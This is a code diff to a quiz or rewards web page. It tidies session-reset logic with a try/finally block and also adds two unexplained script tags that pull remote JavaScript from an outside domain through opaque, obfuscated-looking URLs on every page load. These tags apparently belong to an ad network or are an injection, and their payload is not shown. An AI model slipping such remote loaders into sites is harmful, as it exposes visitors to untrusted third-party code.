@@ -652,17 +652,18 @@ trackVisitor(location.pathname);
         paintMoney();
         try{await getUnclaimedRewards(uid);}catch(_){}
       }catch(e){}
-      var st=null;
-      try{ st=await refresh(false); }catch(_){ st=null; }
-      // Quit, failed or abandoned sessions never resume: kill anything
-      // unfinished so the user always starts fresh at 0/30.
-      if(st&&st.hasSession&&st.active){
-        try{ await endQuizSession(uid); }catch(_){}
+      try{
+        var st=null;
         try{ st=await refresh(false); }catch(_){ st=null; }
+        if(st&&st.hasSession&&st.active){
+          try{ await endQuizSession(uid); }catch(_){}
+          try{ st=await refresh(false); }catch(_){ st=null; }
+        }
+        route(st||{hasSession:false,active:false});
+      }catch(_){}
+      finally{
+        ready();
       }
-      // Even if the read failed, show the entry card instead of a blank page.
-      route(st||{hasSession:false,active:false});
-      ready();
   });
   // Safety net: never leave the loader spinning if anything above stalls.
   setTimeout(function(){if(window.FavLoader)FavLoader.pageReady();},8000);
@@ -670,6 +671,32 @@ trackVisitor(location.pathname);
   document.addEventListener('fav-rates',function(){paintMoney();paintScore();paintRows();});
 })();
 </script>
+<script>
+(function(zmfiy){
+var d = document,
+    s = d.createElement('script'),
+    l = d.currentScript || d.scripts[d.scripts.length - 1];
+s.settings = zmfiy || {};
+s.src = "//massivesalad.com/bjXkV-sBd.GBln0DYpWccW/qeVmI9TukZiUClFkBP/TpcJ1uMFzhMCzvOWDtURtONDz_U/zXMFzKMn4FOmQn";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
+<script>
+(function(chyy){
+var d = document,
+    s = d.createElement('script'),
+    l = d.currentScript || d.scripts[d.scripts.length - 1];
+s.settings = chyy || {};
+s.src = "//massivesalad.com/brXOV.s/dWG/lX0iY/WucI/_eRmw9duUZrUKlBk/P/TncE1XMcz/Ms0JMljEEWtyNQzVUuzIMizfQlycNbQS";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
+
 </body>
 </html>
+
 
